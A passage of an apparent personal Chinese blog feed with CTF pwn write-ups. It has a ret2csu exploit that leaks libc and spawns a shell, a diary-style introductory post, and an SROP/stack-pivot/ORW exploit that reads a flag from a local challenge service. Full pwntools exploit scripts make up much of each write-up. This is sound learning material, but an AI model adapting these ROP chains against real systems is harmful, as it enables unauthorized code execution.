class="hljs-number">1</span>,<span class="hljs-string">&quot;Hello, World\n&quot;</span>,<span class="hljs-number">0xd</span>);<br>  vulnerable_function();<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  undefined1 local_88 [<span class="hljs-number">128</span>];<br>  <br>  read(<span class="hljs-number">0</span>,local_88,<span class="hljs-number">0x200</span>);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目逻辑依旧十分简单，保护只有<code>NX</code>，非常轻松便能覆盖返回地址，缓冲区也量大管饱，而gadget便是我们的<code>libc_csu_init</code></p><p>第一步还是先泄露我们的libc基址</p><p>要注意的是:gadget1的地址就在gadget2后面，所以gadget1要执行两次(到ret才结束!)，不过第二次对我们rop链产生影响的只有<code>add rsp, 0x38</code>罢了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span>   <span class="hljs-comment">#填充</span><br>payload1 += p64(gadget1)<br>payload1 += p64(<span class="hljs-number">0</span>)     <span class="hljs-comment">#对齐rsp</span><br>payload1 += p64(<span class="hljs-number">0</span>)     <span class="hljs-comment">#rbx设置为0</span><br>payload1 += p64(<span class="hljs-number">1</span>)     <span class="hljs-comment">#注意:rbp必须设置为1，否则将进入循环，详情自己看汇编...</span><br>payload1 += p64(write_got) + p64(<span class="hljs-number">1</span>)   <span class="hljs-comment">#注意是call qword ptr [r12+rbx*8]，所以写write_got而不是write_plt</span><br>payload1 += p64(write_got) + p64(<span class="hljs-number">8</span>)<br>payload1 += p64(gadget2)   <br>payload1 += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x38</span>  <span class="hljs-comment">#注意神秘的add rsp,0x38</span><br>payload1 += p64(main_addr)  <span class="hljs-comment">#回到main函数...</span><br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>p.send(payload1)<br></code></pre></td></tr></table></figure><p>然后接收并计算关键地址…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">leak = p.recv(<span class="hljs-number">8</span>)<br>write_addr = u64(leak.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>libc_base = write_addr - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br></code></pre></td></tr></table></figure><p>接下来，我们把字符串<code>/bin/sh</code>和<code>system</code>的真实地址写到bss段上</p><p>第二阶段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x88</span><br>payload2 += p64(gadget1)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">1</span>)<br>payload2 += p64(read_got) + p64(<span class="hljs-number">0</span>)<br>payload2 += p64(bss_addr) + p64(<span class="hljs-number">16</span>)<br>payload2 += p64(gadget2)<br>payload2 += <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x38</span><br>payload2 += p64(main_addr)<br><br>p.send(payload2)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.send(p64(sys_addr))<br>p.send(<span class="hljs-string">&quot;/bin/sh\0&quot;</span>)<br>sleep(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>这样，我们将rdi设置为<code>/bin/sh</code>所在的地址，并将r12设置为system所在的地址，即可实现<code>call system</code>并获得shell</p><p>最终阶段:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload3 = <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x88</span><br>payload3 += p64(gadget1)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">1</span>)<br>payload3 += p64(bss_addr) + p64(bss_addr+<span class="hljs-number">8</span>)<br>payload3 += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload3 += p64(gadget2)<br>payload3 += <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x38</span><br>payload3 += p64(main_addr)<br><br>sleep(<span class="hljs-number">1</span>)<br>p.send(payload3)<br></code></pre></td></tr></table></figure><p>最后也是拿到shell啦~</p><p>你也来试试吧!</p><p>感谢阅读…</p><p>最后还是贴一下完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>main_addr = <span class="hljs-number">0x400564</span><br>bss_addr = <span class="hljs-number">0x601028</span><br>gadget1 = <span class="hljs-number">0x400606</span><br>gadget2 = <span class="hljs-number">0x4005f0</span><br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span><br>payload1 += p64(gadget1)<br>payload1 += p64(<span class="hljs-number">0</span>)<br>payload1 += p64(<span class="hljs-number">0</span>)<br>payload1 += p64(<span class="hljs-number">1</span>)<br>payload1 += p64(write_got) + p64(<span class="hljs-number">1</span>)<br>payload1 += p64(write_got) + p64(<span class="hljs-number">8</span>)<br>payload1 += p64(gadget2)<br>payload1 += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x38</span><br>payload1 += p64(main_addr)<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>p.send(payload1)<br><br>sleep(<span class="hljs-number">1</span>)<br><br>leak = p.recv(<span class="hljs-number">8</span>)<br>write_addr = u64(leak.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>libc_base = write_addr - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x88</span><br>payload2 += p64(gadget1)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">1</span>)<br>payload2 += p64(read_got) + p64(<span class="hljs-number">0</span>)<br>payload2 += p64(bss_addr) + p64(<span class="hljs-number">16</span>)<br>payload2 += p64(gadget2)<br>payload2 += <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x38</span><br>payload2 += p64(main_addr)<br><br>p.send(payload2)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.send(p64(sys_addr))<br>p.send(<span class="hljs-string">&quot;/bin/sh\0&quot;</span>)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload3 = <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x88</span><br>payload3 += p64(gadget1)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">1</span>)<br>payload3 += p64(bss_addr) + p64(bss_addr+<span class="hljs-number">8</span>)<br>payload3 += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload3 += p64(gadget2)<br>payload3 += <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x38</span><br>payload3 += p64(main_addr)<br><br>sleep(<span class="hljs-number">1</span>)<br>p.send(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ps:千万别说我偷懒…</p><p>2026.2.11吐槽:</p><hr><p>在比赛给的elf文件中从来没有看到过csu gadget</p><p>感受呢!!!</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2csu</tag>
      
      <tag>gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hello pwn!</title>
    <link href="/2025/12/25/hello-pwn/"/>
    <url>/2025/12/25/hello-pwn/</url>
    
    <content type="html"><![CDATA[<p>为什么写blog?</p><p>为什么打ctf?</p><p>为什么选择pwn?</p><p>鬼知道</p><p>也许是无聊吧</p><p>用此博客来记录我在<code>pwn</code>学习过程中的一些题解与思考</p><p>希望你能有所收获…</p><p>ps:自言自语</p><p>bro以为自己是网红blogger</p><p>实则静态博客闹麻了</p><p>不过写给以后的自己看似乎也不错???</p><hr><p>modification:</p><p>于2026.1.1</p><p>最近学习了一些栈漏洞</p><p>本打算继续学堆</p><p>但是我要先摆几天</p><p>期末还没复习</p><p>不重要了</p><p>最讨厌的就是卷成绩这种事</p><p>最后</p><p>不止于pwn</p><p>move forward!</p><p>patience is key in life…</p><p>ps:大一上</p><hr><p>补充:</p><p>2026.2.2</p><p>随记</p><p>不知道干嘛</p><p>还是奉行我的人生信条吧</p><p>做自己想做的!</p><p>我感觉的coding能力似乎也太差了，有点过于依赖ai了…</p><p>关于怎么提升也没有什么头绪，也许需要学点数据结构与算法?</p><p>还是做一些项目？</p><p>都试试吧</p><p>尝试新的事物总是很有趣</p><p>顺便借着pwn补补os和计组</p><p>misc osint web crypto reverse嘛</p><p>看看就好</p><p>主要还是没有pwn的那种谜之魅力</p><p>不过我还是太贪玩了</p><p>虽说做出算法题 or pwn题的即时反馈之乐趣也很诱人</p><p>但终究有一定的<code>时间成本</code></p><p>而手机这种低成本的娱乐方式太难以抵抗了!</p><p>不过这也是生活啊~</p><p>最近还和高中同学reunion</p><p>仿佛回到了那个无忧无虑的高三…</p><p>大概就是这样吧</p><p>现在是大一上的寒假</p><p>多年后的我</p><p>祝你看到这些的时候坚守初心</p><p>但也天天开心</p><p>有点唐</p><p>不过</p><p>确实挺不错的</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hello,World!</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/2025/12/25/SROP/"/>
    <url>/2025/12/25/SROP/</url>
    
    <content type="html"><![CDATA[<p>建议先看stack pivot再来这里…</p><p>ok题目来自XSWCTF2025初赛的一道<code>pwn</code>，考察了更加精妙的栈风水布局(基于stack pivot)，同时融合着SROP和ORW，来看看吧!</p><p>ps:虽然比赛时我也没做出来(x_x)</p><p>先看一下题目逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  undefined1 local_78 [<span class="hljs-number">108</span>];<br>  undefined4 local_c;<br>  <br>  local_c = <span class="hljs-number">0</span>;<br>  setbuf(<span class="hljs-built_in">stdin</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>);<br>  sandbox();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hey hey what are you doing here?&quot;</span>);<br>  FUN_004010e0(<span class="hljs-number">0</span>,local_78,<span class="hljs-number">0x50</span>);   #第一次read，没有溢出<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I say STOP doing this!&quot;</span>);<br>  FUN_004010e0(<span class="hljs-number">0</span>,local_78,<span class="hljs-number">0x200</span>);  #第二次read，存在溢出<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>保护虽然只有<code>NX</code>，但是同时开启了<code>seccomp</code>沙箱(sandbox)，使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure><p>查看，发现禁用了<code>execve</code>，所以只能打ORW(open,read,write)，让我们找找关于寄存器的gadget，额，竟然什么都找不到…</p><p>但是我们找到了一个<code>syscall</code>的汇编指令，所以在这种情况下，我们就要使用一招系统内核级的利用，<code>SROP</code>，linux存在一种信号处理机制，当进程收到信号时，内核会先暂停进程执行，然后保存当前寄存器状态到用户栈(sigcontext)，接下来跳转到信号处理函数，等信号处理函数执行完毕后，调用<code>sigreturn</code>系统调用，内核从栈上恢复寄存器状态，因此，我们可以伪造sigcontext结构，同时设置<code>rax</code>为<code>sigreturn</code>的系统调用号<code>15</code>(x86-64)，并执行<code>syscall</code>指令触发<code>sigreturn</code>机制，内核便会从我们伪造的<code>sigcontext</code>中恢复所有我们所设定的寄存器值，从而完全控制进程执行流!</p><p>然而还有一个关键点在于如何将rax设置为15，因为并没有<code>pop rax; ret;</code>的gadget，这时，”不难”想到，rax寄存器上保存的是函数的返回值，我们可以在read时读入15个字节长度的数据，此时rax便被巧妙地设置为了15，此时再执行syscall即可调用sigreturn机制打我们的<code>SROP</code>了</p><p>当然，为了不破坏栈的结构，我们仍然需要利用<code>stack pivot</code>迁移至bss段上伪造我们的栈帧并布局我们的利用链…</p><p>先把有用的地址列出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">read = <span class="hljs-number">0x4012a9</span>    <span class="hljs-comment">#对应执行我们的第二次read的地址</span><br>syscall = <span class="hljs-number">0x4012fa</span><br>leave_ret = <span class="hljs-number">0x4012d3</span>    <span class="hljs-comment">#栈迁移的关键</span><br>puts_got = <span class="hljs-number">0x404010</span><br>puts_plt = <span class="hljs-number">0x4010b0</span><br>bss = <span class="hljs-number">0x404090</span> + <span class="hljs-number">0x500</span>  <span class="hljs-comment">#0x404590(布局的地方)</span><br></code></pre></td></tr></table></figure><p>第一次的read直接跳过，来到我们的第二次read，首先将<code>rbp</code>迁移至bss段，并重新执行一次read(想必都会了吧)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendafter(<span class="hljs-string">b&quot;re you doing here?\n&quot;</span>,<span class="hljs-string">b&quot;beef&quot;</span>)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x70</span> + p64(bss) + p64(read))<br></code></pre></td></tr></table></figure><p>这时在bss段上形成了新的栈帧，我们步骤好srop的<code>sigcontext</code>以泄露libc基址，并进行第二次段内迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = p64(bss + <span class="hljs-number">0x10</span>) + p64(read)   <br>payload = payload.ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += p64(bss - <span class="hljs-number">0x70</span>)<br>payload += p64(leave_ret)<br>payload += p64(bss+<span class="hljs-number">0x100</span>)<br>payload += p64(syscall)<br><br>frame3 = SigreturnFrame()<br>frame3.rip = puts_plt<br>frame3.rsp = bss - <span class="hljs-number">0x60</span> + <span class="hljs-number">8</span><br>frame3.rbp = bss + <span class="hljs-number">0x210</span><br>frame3.rax = <span class="hljs-number">15</span><br>frame3.rdi = puts_got<br>frame3.rsi = <span class="hljs-number">0</span><br>frame3.rdx = <span class="hljs-number">0</span><br><br>payload += <span class="hljs-built_in">bytes</span>(frame3)<br><br>p.send(payload)<br></code></pre></td></tr></table></figure><p>发送完这次payload后再次执行<code>read</code>，我们发送15字节长度的数据以将<code>rax</code>设置为15，同时注意，此时经过我们的布置，<code>rbp</code>目前在<code>0x4045a0</code>的位置，刚好新栈帧<code>rip</code>返回地址的位置便是我们的<code>syscall</code>和<code>sigcontext</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,p64(bss) + <span class="hljs-string">b&quot;\xa9\x12\x40\x00\x00\x00\x00&quot;</span>)<br></code></pre></td></tr></table></figure><p>这次便会真正执行到我们的sigcontext中所设置的寄存器，即，泄露puts真实地址，从而得到libc基址，继而得到open,read,write和所需gadget的地址，而<code>rbp</code>被设置到更上方的地址再次布局我们最后的<code>ORW</code>，<code>rsp</code>设置在了我们先前<code>read</code>指令的所在地，因此，进行最后一次read，直接布置最终的rop链…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">open</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write=libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rread=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>rdi=libc_base+<span class="hljs-number">0x10f78b</span><br>rsi=libc_base+<span class="hljs-number">0x110a7d</span><br>rdx=<span class="hljs-number">0x4012fc</span><br>ret=libc_base+<span class="hljs-number">0x2882f</span><br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(bss+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>payload += p64(rdi) + p64(bss+<span class="hljs-number">0x210</span>) + p64(rsi) + p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-built_in">open</span>)  <span class="hljs-comment">#bss+0x210就是flag字符串的地址!</span><br>payload += p64(rdi) + p64(<span class="hljs-number">3</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rread)  <span class="hljs-comment">#3为fd,rsi随便放哪里好了...</span><br>payload += p64(rdi) + p64(<span class="hljs-number">1</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(write)  <span class="hljs-comment">#将flag写到stdout，注意对齐...</span><br></code></pre></td></tr></table></figure><p>最终，在精妙的布局与利用下，我们成功获得了flag…</p><p>由于迷失于错综的地址，当时我也是对着<code>gdb</code>调试了老半天才算看懂这道题的wp，写出来过程也算了却一下自己的心魔，依旧贴一张图帮助你思考…</p><p><img src="/images/5.png" alt="内存布局"></p><p>最后贴一下完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">40315</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>read = <span class="hljs-number">0x4012a9</span><br>syscall = <span class="hljs-number">0x4012fa</span><br>leave_ret = <span class="hljs-number">0x4012d3</span><br>puts_got = <span class="hljs-number">0x404010</span><br>puts_plt = <span class="hljs-number">0x4010b0</span><br>bss = <span class="hljs-number">0x404090</span> + <span class="hljs-number">0x500</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br><br>p.sendafter(<span class="hljs-string">b&quot;re you doing here?\n&quot;</span>,<span class="hljs-string">b&quot;beef&quot;</span>)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x70</span> + p64(bss) + p64(read))<br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = p64(bss + <span class="hljs-number">0x10</span>) + p64(read)<br>payload = payload.ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += p64(bss-<span class="hljs-number">0x70</span>)<br>payload += p64(leave_ret)<br>payload += p64(bss+<span class="hljs-number">0x100</span>)<br>payload += p64(syscall)<br><br>frame3 = SigreturnFrame()<br>frame3.rip = puts_plt<br>frame3.rsp = bss-<span class="hljs-number">0x60</span>+<span class="hljs-number">8</span><br>frame3.rbp = bss+<span class="hljs-number">0x210</span><br>frame3.rax = <span class="hljs-number">15</span><br>frame3.rdi = puts_got<br>frame3.rsi = <span class="hljs-number">0</span><br>frame3.rdx = <span class="hljs-number">0</span><br><br>payload += <span class="hljs-built_in">bytes</span>(frame3)<br><br>p.send(payload)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,p64(bss) + <span class="hljs-string">b&quot;\xa9\x12\x40\x00\x00\x00\x00&quot;</span>)<br><br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">open</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write=libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rread=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>rdi=libc_base+<span class="hljs-number">0x10f78b</span><br>rsi=libc_base+<span class="hljs-number">0x110a7d</span><br>rdx=<span class="hljs-number">0x4012fc</span><br>ret=libc_base+<span class="hljs-number">0x2882f</span><br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(bss+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>payload += p64(rdi) + p64(bss+<span class="hljs-number">0x210</span>) + p64(rsi) + p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-built_in">open</span>)<br>payload += p64(rdi) + p64(<span class="hljs-number">3</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rread)<br>payload += p64(rdi) + p64(<span class="hljs-number">1</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(write)<br><br>p.send(payload)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>就到这里便结束了，感谢阅读，生活愉快…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内存布局</tag>
      
      <tag>SROP</tag>
      
